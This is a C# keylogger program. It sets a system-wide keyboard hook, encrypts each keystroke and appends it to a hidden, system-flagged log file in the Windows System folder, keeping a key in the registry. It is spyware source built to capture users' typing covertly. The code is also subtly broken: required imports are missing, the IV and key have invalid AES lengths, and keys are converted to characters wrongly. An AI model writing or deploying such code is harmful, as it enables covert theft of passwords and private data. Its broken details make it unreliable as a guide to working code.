using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Keylogger
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static void Main(string[] args)
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process currProcess = Process.GetCurrentProcess())
            using (ProcessModule currModule = currProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(currModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                StringBuilder keyPress = new StringBuilder();
                keyPress.Append(Convert.ToChar(vkCode));

                // Get the encryption key from the registry
                string encKey = Registry.GetValue(@"HKEY_CURRENT_USER\Keylogger", "EncryptionKey", "").ToString();

                if (string.IsNullOrEmpty(encKey))
                {
                    // Create the encryption key if it doesn't exist
                    encKey = GenerateEncryptionKey();
                    Registry.SetValue(@"HKEY_CURRENT_USER\Keylogger", "EncryptionKey", encKey);
                }

                string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "keylog.enc");

                if (!File.Exists(logFilePath))
                {
                    File.Create(logFilePath).Dispose();
                    File.SetAttributes(logFilePath, FileAttributes.Hidden | FileAttributes.System);
                }

                using (Aes aes = Aes.Create())
                {
                    aes.Key = Encoding.UTF8.GetBytes(encKey);
                    aes.IV = Encoding.UTF8.GetBytes("YourInitializationVectorHere");

                    using (FileStream fs = new FileStream(logFilePath, FileMode.Append))
                    {
                        using (CryptoStream cs = new CryptoStream(fs, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            byte[] inputBytes = Encoding.UTF8.GetBytes(keyPress.ToString() + Environment.NewLine);
                            cs.Write(inputBytes, 0, inputBytes.Length);
                        }
                    }
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GenerateEncryptionKey()
        {
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                byte[] key = new byte[32];
                rng.GetBytes(key);
                return Convert.ToBase64String(key);
            }
        }
    }
}